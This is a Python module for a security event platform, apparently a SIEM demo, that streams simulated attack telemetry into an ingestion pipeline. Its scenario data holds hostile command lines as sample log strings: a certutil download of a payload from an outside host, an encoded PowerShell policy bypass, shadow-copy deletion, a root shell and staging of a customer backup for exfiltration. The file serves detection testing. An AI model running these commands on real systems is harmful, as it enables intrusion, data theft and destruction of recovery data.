import asyncio
import math
import uuid
from datetime import datetime, timezone
from typing import Dict, Any, Optional, List

from app.services.collectors.base_collector import BaseCollector
from app.schemas.event import SecurityEventCreate
from app.database import SessionLocal
from app.services.ingestion_service import normalize_and_ingest_events


SUPPORTED_SCENARIOS = {
    "scenario_1",
    "scenario_2",
    "scenario_3",
    "scenario_4",
    "normal_enterprise"
}


class LiveDemoStreamCollector(BaseCollector):
    def __init__(self, collector_id: str = "collector-demo-stream"):
        super().__init__(
            collector_id=collector_id,
            name="Demo Attack Simulator Stream",
            collector_type="DEMO_STREAM"
        )
        self.stream_task: Optional[asyncio.Task] = None
        self.is_paused: bool = False
        self.current_scenario: str = "scenario_1"
        self.rate_per_second: float = 1.0  # Events per second
        self.stream_history: List[Dict[str, Any]] = []
        self.stream_state: str = "IDLE"

    async def start(self):
        # Default start idle
        self.is_running = True

    async def stop(self):
        await self.stop_stream()
        self.is_running = False

    async def start_stream(self, scenario: str = "scenario_1", rate: float = 1.0):
        if scenario not in SUPPORTED_SCENARIOS:
            raise ValueError(f"Unsupported demo scenario: {scenario}")
        if not math.isfinite(rate) or not 0.5 <= rate <= 4.0:
            raise ValueError("Stream rate must be between 0.5 and 4.0 events/sec")
        if self.stream_task and not self.stream_task.done():
            raise RuntimeError("A demo stream is already active")
        if not self.is_running:
            raise RuntimeError("Demo stream collector is not running")

        self.current_scenario = scenario
        self.rate_per_second = rate
        self.is_paused = False
        self.error_message = None
        self.stream_state = "STARTING"
        self.stream_task = asyncio.create_task(self._stream_loop())
        print(f"[{self.collector_id}] Started continuous demo stream: {scenario} @ {rate} eps")

    async def pause_stream(self):
        if not self.stream_task or self.stream_task.done():
            raise RuntimeError("No active demo stream to pause")
        self.is_paused = True
        self.stream_state = "PAUSED"

    async def resume_stream(self):
        if not self.stream_task or self.stream_task.done():
            raise RuntimeError("No active demo stream to resume")
        if not self.is_paused:
            raise RuntimeError("Demo stream is not paused")
        self.is_paused = False
        self.stream_state = "STREAMING"

    async def stop_stream(self):
        self.is_paused = False
        if self.stream_task:
            task = self.stream_task
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
            self.stream_task = None
        self.stream_state = "STOPPED"
        print(f"[{self.collector_id}] Stopped demo stream.")

    async def _stream_loop(self):
        if not self.is_paused:
            self.stream_state = "STREAMING"
        events_catalog = self._generate_scenario_events(self.current_scenario)
        interval = 1.0 / self.rate_per_second

        try:
            while self.is_running:
                for item in events_catalog:
                    while self.is_paused:
                        await asyncio.sleep(0.05)

                    now = datetime.now(timezone.utc)
                    evt = SecurityEventCreate(
                        event_id=f"EVT-STREAM-{uuid.uuid4().hex[:12].upper()}",
                        event_type=item["event_type"],
                        severity=item["severity"],
                        timestamp=now,
                        source_ip=item.get("source_ip"),
                        destination_ip=item.get("destination_ip"),
                        source_port=item.get("source_port"),
                        destination_port=item.get("destination_port"),
                        protocol=item.get("protocol", "TCP"),
                        username=item.get("username"),
                        host=item.get("host"),
                        process_name=item.get("process_name"),
                        command_line=item.get("command_line"),
                        file_path=item.get("file_path"),
                        file_action=item.get("file_action"),
                        source_type="DEMO_STREAM",
                        source_identifier=f"scenario:{self.current_scenario}",
                        is_simulated=True,
                        raw_payload=item.get("raw_payload", "Live simulated telemetry stream")
                    )

                    db = SessionLocal()
                    try:
                        result, saved_events = normalize_and_ingest_events(
                            db, [evt], auto_queue=True
                        )
                        if result.errors:
                            self.error_count += result.errors
                            self.error_message = "One or more generated events failed ingestion"
                        if result.accepted != len(saved_events):
                            raise RuntimeError(
                                "Ingestion accepted count did not match persisted events"
                            )
                        if not saved_events:
                            raise RuntimeError(
                                "Generated demo event was not accepted by ingestion"
                            )

                        self.total_received += result.accepted
                        self.last_event_at = now
                        self.stream_history.append({
                            "event_id": saved_events[0].event_id,
                            "scenario": self.current_scenario,
                            "event_type": saved_events[0].event_type,
                            "timestamp": now.isoformat(),
                            "summary": (
                                saved_events[0].command_line
                                or saved_events[0].file_action
                                or saved_events[0].event_type
                            )
                        })
                        if len(self.stream_history) > 50:
                            self.stream_history.pop(0)
                    except Exception as exc:
                        self.error_count += 1
                        self.error_message = str(exc)
                        self.stream_state = "ERROR"
                        print(f"[{self.collector_id}] Demo event ingestion failed: {exc}")
                        return
                    finally:
                        db.close()

                    await asyncio.sleep(interval)

                await asyncio.sleep(interval * 2)
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            self.error_count += 1
            self.error_message = str(exc)
            self.stream_state = "ERROR"
            print(f"[{self.collector_id}] Demo stream failed: {exc}")

    def _generate_scenario_events(self, scenario: str) -> List[Dict[str, Any]]:
        if scenario == "scenario_1":
            # Brute force SSH
            return [
                {"event_type": "authentication", "severity": "MEDIUM", "source_ip": "185.220.101.45", "destination_ip": "10.0.1.15", "destination_port": 22, "username": "sarah.connor", "host": "AUTH-SRV-01", "file_action": "FAILED", "command_line": "sshd: Failed password for invalid user sarah.connor"},
                {"event_type": "authentication", "severity": "MEDIUM", "source_ip": "185.220.101.45", "destination_ip": "10.0.1.15", "destination_port": 22, "username": "sarah.connor", "host": "AUTH-SRV-01", "file_action": "FAILED", "command_line": "sshd: Failed password for invalid user sarah.connor"},
                {"event_type": "authentication", "severity": "HIGH", "source_ip": "185.220.101.45", "destination_ip": "10.0.1.15", "destination_port": 22, "username": "sarah.connor", "host": "AUTH-SRV-01", "file_action": "FAILED", "command_line": "sshd: Failed password attempt 3"},
                {"event_type": "authentication", "severity": "HIGH", "source_ip": "185.220.101.45", "destination_ip": "10.0.1.15", "destination_port": 22, "username": "sarah.connor", "host": "AUTH-SRV-01", "file_action": "FAILED", "command_line": "sshd: PAM-AUTH-FAIL threshold exceeded"},
            ]
        elif scenario == "scenario_2":
            # Network scan
            ports = [21, 22, 80, 443, 445, 1433, 3389, 8080]
            return [
                {"event_type": "network_connection", "severity": "MEDIUM" if p in [80, 443] else "HIGH", "source_ip": "192.0.2.144", "destination_ip": "10.0.1.50", "destination_port": p, "host": "WEB-PROD-01", "command_line": f"TCP SYN probe targeting port {p}"}
                for p in ports
            ]
        elif scenario == "scenario_3":
            # Account compromise & data staging
            return [
                {"event_type": "authentication", "severity": "MEDIUM", "source_ip": "198.51.100.23", "destination_ip": "10.0.1.20", "username": "vikram.sharma", "host": "VPN-GW-01", "file_action": "FAILED", "command_line": "Failed password attempt via VPN Portal"},
                {"event_type": "authentication", "severity": "CRITICAL", "source_ip": "198.51.100.23", "destination_ip": "10.0.1.20", "username": "vikram.sharma", "host": "VPN-GW-01", "file_action": "SUCCESS_POST_BURST", "command_line": "Successful VPN session post-burst"},
                {"event_type": "privilege_escalation", "severity": "CRITICAL", "source_ip": "198.51.100.23", "username": "vikram.sharma", "host": "DB-FIN-01", "command_line": "sudo -u root bash -i"},
                {"event_type": "file_access", "severity": "HIGH", "username": "vikram.sharma", "host": "DB-FIN-01", "file_path": "/var/backups/customers_backup.sql", "command_line": "tar -czf /tmp/exfil.tar.gz /var/backups/customers_backup.sql"}
            ]
        elif scenario == "scenario_4":
            # LOLBin & Ransomware Shadow copy deletion
            return [
                {"event_type": "process_execution", "severity": "HIGH", "username": "local_admin", "host": "WS-DEV-108", "process_name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f https://update-service-cloud.xyz/payload.bin C:\\Windows\\Temp\\loader.exe"},
                {"event_type": "process_execution", "severity": "HIGH", "username": "local_admin", "host": "WS-DEV-108", "process_name": "powershell.exe", "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgA..."},
                {"event_type": "process_execution", "severity": "CRITICAL", "username": "local_admin", "host": "WS-DEV-108", "process_name": "vssadmin.exe", "command_line": "vssadmin.exe delete shadows /all /quiet", "file_action": "INHIBIT_SYSTEM_RECOVERY"}
            ]
        else:
            # Normal enterprise baseline
            return [
                {"event_type": "network_connection", "severity": "INFO", "source_ip": "10.0.1.105", "destination_ip": "8.8.8.8", "destination_port": 53, "host": "WS-CORP-01", "command_line": "DNS query lookup"},
                {"event_type": "authentication", "severity": "INFO", "source_ip": "10.0.1.105", "destination_ip": "10.0.1.5", "destination_port": 443, "username": "john.doe", "host": "WS-CORP-01", "file_action": "SUCCESS", "command_line": "Kerberos SSO authentication"},
                {"event_type": "network_connection", "severity": "INFO", "source_ip": "10.0.1.105", "destination_ip": "10.0.1.200", "destination_port": 443, "host": "WS-CORP-01", "command_line": "HTTPS GET /intranet/dashboard"}
            ]

    def get_status(self) -> Dict[str, Any]:
        res = super().get_status()
        res.update({
            "is_paused": self.is_paused,
            "current_scenario": self.current_scenario,
            "rate_per_second": self.rate_per_second,
            "is_streaming": bool(self.stream_task and not self.stream_task.done()),
            "stream_state": self.stream_state,
            "stream_history": self.stream_history[-10:]
        })
        return res

demo_stream_collector = LiveDemoStreamCollector()
